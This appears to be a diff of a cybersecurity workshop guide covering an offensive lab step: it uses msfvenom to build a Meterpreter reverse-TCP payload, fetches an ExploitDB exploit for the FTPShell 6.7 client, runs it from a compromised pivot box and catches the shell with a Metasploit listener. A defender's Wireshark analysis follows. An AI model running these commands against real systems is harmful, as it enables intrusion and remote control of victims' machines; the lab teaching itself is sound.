@@ -24,7 +24,7 @@ We are completely OK with you breaking stuff as you learn, so don't be afraid to
 
 # Setup
 
-You may complete this workshop using one of the provided laptops or your own. At a minimum, you will need a system with an SSH client and a remote desktop client. Depending on what type of system you're on, the following programs will meet these requirements.
+You may complete this workshop using one of the provided laptops or your own. At a minimum, you will need a system with an SSH client and a VNC client. Depending on what type of system you're on, the following programs will meet these requirements.
 
 OS | SSH | VNC
 ------------ | ------------ | -------------
@@ -207,38 +207,53 @@ Luckily for us, when we try it on the GUI login from earlier, it does in fact wo
 
 # Exploit-RCE
 
-With our newfound access we can do more in-depth analysis of what protocols and programs are being used inside the network. Normally a firewall or NAT would prevent us from scanning a local internet from the outside but since we have access to the interal network we can gather much more information! However, it seems that after some additional scans there arent any other boxes that might be vulnerable to the drupal attack. Let's look at our localhost instead. Run the following command:
-```
+With our newfound access we can do more in-depth analysis of what protocols and programs are being used inside the network. Normally a firewall or network address translation (NAT) prevent us from scanning a local network from the outside. But, this is not a problem for us since we have access to the internal network from the box we just gained access to.
+
+As we discussed earlier, in the real-world, an attacker would delve into all the other hosts on the network using the new pivot. For this lab, however, we will assume that this doesn't lead to any useful information. Instead, let's see if there's any additional information on this box. We will start by seeing if it is hosting any other exploitable network services. Run the following command:
+
+```bash
 netstat -ltnup
 ```
 
-This will display all the open sockets on our system. Are there any interesting ports open? How about port 21? That port is designated as the port for FTP, or File Transfer Protocol. You should see the PID and name of the process that is listening on port 21 at the end of our output. Now that we know we are serving data to clients maybe we can find a vulnerability that allows us to compromise their system. Let's say we analyze some traffic data and are able to determine that the hosts on this network use an ftp client called FTPShell 6.7. What can we do with that information? 
+This will display all the open sockets on our system. Are there any interesting ports open? How about port 21? That port is designated as the port for FTP, or File Transfer Protocol. FTP is a protocol used to transfer files from one computer to another, similar to the way HTTP is a protocol used to transfer web pages from one computer to another. From the above command, you should see the PID and name of the process that is listening on port 21 at the end of our output. 
 
-Navigate to www.exploit-db.com and search for FTPShell Client. There are a slew of exploits for this client! Lets look at the exploit for the Client version 6.7. We can see that there is a big bytecode blob made with a tool called msfvenom that opens calc.exe on the victim. Opening calc.exe however, does not gain us additional access to the network. We want to open a shell like the one we have on the pivot box! On our Kali box, run the following command:
+Now that we know we are serving data to clients over FTP, maybe we can find a vulnerability that allows us to compromise the systems that are connecting to our compromised pivot box to retrieve files via FTP. Let's say we analyze some traffic data and are able to determine that the hosts on this network connect to us using an ftp client called FTPShell 6.7. What can we do with that information? 
+
+Navigate to [ExploitDB](www.exploit-db.com) and search for FTPShell Client. There are a slew of exploits for this client! Let's look at the exploit for the Client version 6.7. We can see that there is a big bytecode blob made with a tool called msfvenom that opens `calc.exe` on the victim. Opening `calc.exe`, however, doesn't seem directly helpful (it does not gain us additional access to the network) so why bother?
+
+This is what is known as a proof of concept (POC). The point of running `calc.exe` is not to do math, but to prove that we can run any code we want. In other words, if we can do this, then we can run other code that helps us directly like open a shell on another target, just like we did on the current box.
+
+We are going to edit the exploit so that it gives us a Meterpreter shell on the target box. A Meterpreter shell is a shell created in an pen-testing program called Metasploit that has many useful exploitation tools built-in. On your Kali box, run the following command:
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp -f python -b '\x00\x22\x0d\x0a\x5c\' LHOST=$(sudo ifconfig eth0 | awk '$0~/inet / {print $2}') LPORT=443 > ~/rtcp_bytecode.txt
 ```
-sudo ifconfig eth0
+
+This complicated looking command does the following:
+
+1. Figure out your IP address
+2. Run the program `msfvenom` to generate shellcode (i.e. computer instructions in the Assembly (ASM) computer langauge) that will open a shell for you (at the IP address from step 1) on the computer that ends up executing the code
+3. Wrap the ASM shellcode in python so that it can be run from a Python script
+4. Do some reencoding magic so the code doesn't trigger firewalls or anti-virus programs
+5. Write the results out to a file called `rtcp_bytecode.txt` 
+
+We need to get the exploit POC, then replace the code to invoke `calc.exe` with the shellcode we just generated. Retrieve the original by running the following:
+
+```bash
+wget https://www.exploit-db.com/raw/44596 > ~/ftpexploit.py
 ```
-Then, use the IP address for inet in the LHOST parameter in the following commands:
-```
-cd ~
-msfvenom -p windows/meterpreter/reverse_tcp -f python -b '\x00\x22\x0d\x0a\x5c\' LHOST=xxx.xxx.xxx.xxx LPORT=443 > rtcp_bytecode.txt
-```
-Alternatively, you can run the following command and it should fill in LHOST for you.
-```
-msfvenom -p windows/meterpreter/reverse_tcp -f python -b '\x00\x22\x0d\x0a\x5c\' LHOST=$(sudo ifconfig eth0 | awk '$0~/inet / {print $2}') LPORT=443 > rtcp_bytecode.txt
-```
-Now you have windows shellcode! Now we need to add it to our exploit run the following command to download the exploit:
-```
-wget https://www.exploit-db.com/raw/44596 > ftpexploit.py
-```
-Now lets replace the bytecode in the exploit with our newly generated shellcode. You can do this anyway you'd like, with a CLI or GUI text editor.
+
+Replace the bytecode in the exploit (`ftpexploit.py`) with the shellcode you generated (`rtcp_bytecode.txt`). You can do this anyway you'd like, with a CLI or GUI text editor.
 
 With our exploit ready, lets move it to the pivot box. From the pivot box, use Secure copy (scp) to send the file over.
+
+```bash
+scp ec2-user@[your-internal-ip]:~/ftpexploit.py ~/
 ```
-scp ec2-user@[your-internal-ip]:~/ftpexploit.py ./
-```
-We are now ready to launch our exploit. Before we do that however, we need to create our listener that will handle the shell we are about to open on the victim. On the Kali box, go to an available terminal and run the following commands:
-```
+
+We are now ready to launch our exploit from the compromised pivot box. Once we launch our exploit, if a target tries to connect to the pivot via FTP, our exploit shellcode will be transmitted to it, then executed on that new target. This will the new target to connect to our original Kali box and offer a shell on itself. The final piece to make all this work is to create a listener on our Kali box that will handle the shell we are about to open on the target. On the Kali box, go to an available terminal and run the following commands:
+
+```bash
 sudo msfconsole
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
@@ -246,21 +261,27 @@ set lhost [your internal ip]
 set lport 443
 run
 ```
+
 It should look something like this:
 ![listener.png](/img/listener.png)
 
 Now lets run that exploit on the pivot box. 
+
+```bash
+sudo python ~/ftpexploit.py
 ```
-sudo python ftpexploit.py
-```
+
 ![server.png](/img/server.png)
 
 Then, once the victim connects to your box you should have a meterpreter shell that looks like this!
+
 ![meterpreter.png](/img/server.png)
 
-Now we have a fully powered meterpreter shell on the target! While not something we will cover in this demo, the very first thing we want to do is migrate our shell into another process as the FTPShell we just exploited is still open and frozen on the victim’s desktop! And everyone knows the first thing you do when something freezes is try to kill it, meaning we would lose our shell!
+We now have a fully powered meterpreter shell on the target! At this point you have a foothold on a second system which you achieved by pivoting through the first system you compromised. In the real-world, there are a series of actions you would now conduct, collectively called "post-exploitation" or "privilege escalation" depending on the situation. For the purpose of this lab, however, we will stop our offensive operation here.
 
 # Surveil
+
+Let us now switch sides and look at what just happened from the perspective of a defender. 
 
 The attackers have breached our network! We need to discover how, and more importantly, why they did it. We are going to gather information from a few different sources to trace their steps and patch the holes they used to gain access. Lets start by opening the .pcap file we captured via wireshark. Begin exploring the interface and take note of anything interesting. There is a lot of information in these packet captures so lets break it down. The first thing you should notice is a large group of red and grey packets. The source of the grey packets will be your box and source of the red boxes is the target. If you look at the info column you'll see the flags for the grey packets are SYN and the red has RST,ACK. Additionally, if you look at the destination port on all the grey packets you might notice that all the destination ports are seemingly random. Lastly, the time between the packets sent is very small. With all these details we can ascertain that this is a SYN scan on our box. If you look at the SYN packet sent to port 22, instead of sending back a RST, our box responds with a SYN,ACK. These differences are what allow nmap to determine which ports are open/listening as in, there is a process or program using that port to establish communication.
 ![synscan.png](/img/synscan.PNG)
